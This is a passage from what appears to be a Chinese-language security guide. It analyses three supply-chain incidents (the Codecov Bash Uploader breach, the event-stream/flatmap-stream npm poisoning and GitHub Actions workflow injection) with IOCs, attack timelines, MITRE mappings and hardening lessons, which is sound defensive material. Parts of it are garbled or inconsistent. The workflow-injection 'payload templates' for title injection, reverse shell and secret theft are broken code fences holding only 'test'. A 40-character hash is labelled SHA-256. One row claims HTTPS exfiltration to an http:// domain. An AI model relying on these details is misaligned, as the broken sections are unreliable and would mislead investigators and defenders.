| 潜伏期 | 2021-01-31 至 2021-04-01，约 2 个月 | 🟡 高度可疑 |
| 入侵路径 | 攻击者通过 Codecov Docker 构建环境的凭证泄露获得访问权限 | 🔴 确认恶意 |

**IOC：**

```yaml
ioc:
  malicious_url:
    - "https://codecov.io uploader bash"
    - "https://upcodecov[.]io"
    - "https://codecov[.]io/bash"
  compromised_files:
    - "codecov"  # Bash Uploader 脚本
    - "upload"
  external_ips:
    - "104.248.40.162"
    - "82.221.128.65"
  sha256_malicious:
    - "a7e12bab1d8d780e79d1db6c15f8d4a43c6d71029f75f526f11d06b3f4a8bb2e"
  affected_repos_count: 29000
  leaked_secrets:
    - "GitHub Personal Access Tokens"
    - "AWS Access Keys"
    - "GCP Service Account Keys"
    - "Heroku API Keys"
    - "DataDog API Keys"
```

**经验教训：**

| 经验维度 | 具体措施 |
|---------|---------|
| 依赖完整性 | 始终通过固定哈希值验证外部脚本，避免 `curl \| bash` 模式 |
| 构建环境隔离 | 使用不可变构建环境，定期重建 Docker 镜像 |
| Secrets 最小化 | 使用 OIDC Identity Federation 替代长期 Secrets |
| 监控与审计 | 部署出站流量监控，检测异常的外部数据传输 |
| 事件响应 | 建立 CI/CD 供应链安全事件的专项应急响应流程 |
| 镜像签名 | 使用 Sigstore/Cosign 对构建产物进行签名和验证 |

### 案例二：event-stream npm 包投毒事件（2018）

**事件概述：**

2018 年 11 月，流行的 npm 包 `event-stream`（周下载量超过 200 万）被发现植入了针对 Copay 钱包（Bitcoin 多签名钱包）的恶意代码。攻击者通过社会工程获得了包的维护权，然后在依赖链中引入了恶意的 `flatmap-stream` 包。

**攻击链描述：**

```
攻击链时间线：
2018-09     攻击者（right9ctrl）通过社会工程获得 event-stream 维护权
            │  原维护者 Dominic Tarr 因不再活跃，将维护权转移
            ▼
2018-10     攻击者添加恶意依赖 flatmap-stream@0.0.2
            │  恶意代码混淆在 flatmap-stream 中
            ▼
2018-11     恶意代码被激活（event-stream@3.3.6）
            │  目标：Copay 钱包 v1.x（Bitcoin 多签名钱包）
            │  手法：窃取钱包私钥并发送到远程服务器
            ▼
2018-11-26  安全研究员 Jules Blinder 发现并报告
            │
            ▼
2018-11-27  npm 移除恶意版本
            │
            ▼
后续        flatmap-stream 从 npm 移除
            event-stream 恢复到干净版本
```

**恶意 payload 分析：**

```javascript
// 恶意代码（混淆后还原分析）：
// 1. 检测运行环境是否为 Copay 钱包
// 2. 如果是 Copay 钱包，窃取钱包配置数据
// 3. 将窃取的数据通过 HTTP POST 发送到远程服务器

// 恶意代码的关键逻辑：
// - 定位 Copay 的 localStorage
// - 提取钱包的私钥和助记词
// - 将数据加密后发送到 attacker-controlled 域名
```

**取证发现：**

| 取证维度 | 发现内容 | 证据强度 |
|---------|---------|---------|
| 维护者接管 | 攻击者通过社会工程获得 npm 包维护权 | 🔴 确认恶意 |
| 依赖引入 | 恶意 `flatmap-stream@0.0.2` 作为 `event-stream` 的依赖被添加 | 🔴 确认恶意 |
| 目标定向 | 恶意代码仅对 Copay 钱包 v1.x 生效 | 🔴 确认恶意 |
| 数据窃取 | 窃取钱包私钥和助记词 | 🔴 确认恶意 |
| 外传通道 | 通过 HTTPS POST 发送到 `http://fridgerator[.]cc` | 🔴 确认恶意 |
| 检测延迟 | 从投毒到发现约 2 个月 | 🟡 高度可疑 |

**IOC：**

```yaml
ioc:
  malicious_packages:
    - "event-stream@3.3.6"
    - "flatmap-stream@0.0.2"
  attacker_github: "right9ctrl"
  attacker_npm: "right9ctrl"
  c2_domain:
    - "fridgerator[.]cc"
    - "airds[.]cn"
  sha256_malicious:
    - flatmap-stream: "df3538cf50e8d8212f204e4e0b9a891e6315820c"
  target_software: "Copay Bitcoin Wallet v1.x"
  leaked_data:
    - "Bitcoin wallet private keys"
    - "Wallet mnemonics (seed phrases)"
    - "Wallet configuration data"
  timeline:
    takeover: "2018-09"
    malicious_version: "2018-10"
    discovery: "2018-11-26"
    remediation: "2018-11-27"
```

**经验教训：**

| 经验维度 | 具体措施 |
|---------|---------|
| 维护者验证 | 核心依赖的维护者变更应经过组织审核 |
| 依赖锁定 | 使用 lockfile 锁定依赖版本，禁止自动更新 |
| 最小依赖 | 定期审计依赖树，移除不必要的依赖 |
| 安全扫描 | 使用 `npm audit` 和 `socket.dev` 检测可疑依赖行为 |
| 钱包安全 | 加密货币钱包不应依赖于第三方 npm 包处理关键操作 |
| 社区协作 | 关注 npm 安全公告和社区安全研究员的报告 |

### 案例三：GitHub Actions Workflow Injection 攻击链分析（2022-2023）

**事件概述：**

2022-2023 年间，安全研究员发现并披露了大量 GitHub Actions Workflow Injection 漏洞。这些漏洞被多个攻击者利用，形成了一条完整的供应链攻击链。

**攻击模式分析：**

| 攻击阶段 | 攻击手法 | 技术细节 | MITRE ATT&CK |
|---------|---------|---------|-------------|
| 1. 侦察 | 扫描公开仓库的 Workflow 文件 | 使用 GitHub Search API 搜索包含 `${{ github.event.*.title }}` 等模式的 Workflow | T1593 |
| 2. 初始访问 | 创建恶意 Issue/PR | 在目标仓库创建包含注入 Payload 的 Issue | T1195.002 |
| 3. 执行 | Workflow Injection 执行恶意代码 | Payload 在 Workflow 运行时被 Shell 执行 | T1059 |
| 4. 权限提升 | 窃取 Secrets 并获取更高权限 | 读取 `GITHUB_TOKEN` 或其他 Secrets | T1552.001 |
| 5. 持久化 | 修改 Workflow 或创建后门 | 在 Workflow 中添加持久化步骤 | T1053 |
| 6. 横向移动 | 使用窃取的凭证访问其他资源 | 使用 GitHub PAT 访问其他仓库 | T1078.004 |
| 7. 影响 | 供应链投毒 | 修改构建过程，注入恶意代码 | T1195.002 |

**典型 Payload 模板：**

```
# Issue/PR 标题 Payload（触发 Workflow Injection）：
```
test
```

# 反弹 Shell Payload（在 Workflow 日志中执行）：
```
test
```

# 数据外传 Payload（窃取 Secrets 并外传）：
```
test
```
```

**经验教训：**

| 经验维度 | 具体措施 |
|---------|---------|
| 输入消毒 | 永远不要在 `run:` 脚本中直接使用 `${{ }}` 表达式引用外部输入 |
| 环境变量隔离 | 使用 `env:` 将表达式值传递给环境变量，再通过 `$VAR` 引用 |
| 最小权限 | Workflow 使用最小必要权限，避免 `permissions: write-all` |
| Action 版本锁定 | 使用完整的 SHA 哈希锁定 Action 版本，避免使用 `@main` 或 `@latest` |
| 审查机制 | 对 Issue/PR 触发的 Workflow 执行实施人工审查 |

---

## 0x0B 参考资料

| 编号 | 资料名称 | 类型 | URL |
|-----|---------|------|-----|
| 1 | GitHub Actions Security Hardening | 官方文档 | https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions |
| 2 | SLSA - Supply-chain Levels for Software Artifacts | 框架文档 | https://slsa.dev/ |
| 3 | Sigstore Documentation | 官方文档 | https://docs.sigstore.dev/ |
| 4 | OWASP Top 10 CI/CD Security Risks | 安全标准 | https://owasp.org/www-project-top-10-ci-cd-security-risks/ |
| 5 | Codecov Security Incident Postmortem | 事件报告 | https://about.codecov.io/security-update/ |
| 6 | event-stream npm package incident analysis | 事件分析 | https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident |
| 7 | A Primer on GitOps and Supply Chain Security | 研究论文 | https://arxiv.org/abs/2305.02664 |
| 8 | GitHub Actions Security Best Practices | 安全指南 | https://securitylab.github.com/research/github-actions-preventing-pwn-requests/ |
| 9 | in-toto Attestation Specification | 规范文档 | https://in-toto.io/ |
| 10 | Kubernetes GitOps Security Best Practices | 安全指南 | https://www.cncf.io/blog/2022/06/28/gitops-security-best-practices/ |
| 11 | MITRE ATT&CK - Supply Chain Compromise | 攻击框架 | https://attack.mitre.org/techniques/T1195/002/ |
| 12 | SBOM (Software Bill of Materials) - NTIA | 政策文档 | https://www.ntia.gov/focus-areas/software-transparency |